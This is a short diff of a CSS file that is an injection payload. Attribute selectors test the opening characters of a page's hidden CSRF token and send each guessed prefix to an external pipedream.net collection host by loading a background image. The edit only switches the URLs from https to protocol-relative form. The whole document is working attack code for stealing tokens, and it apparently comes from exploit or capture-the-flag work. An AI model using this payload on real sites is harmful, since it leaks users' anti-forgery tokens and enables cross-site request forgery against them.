@@ -3,9 +3,9 @@ body{
 }
 
 input[name=csrf][value^=b]{
-    background-image: url(https://eoa21cz1z5v9xqj.m.pipedream.net/b);
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/b);
 }
 
 input[name=csrf][value^=csrF] ~ * {
-    background-image: url(https://eoa21cz1z5v9xqj.m.pipedream.net/csrF);
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/csrF);
 }
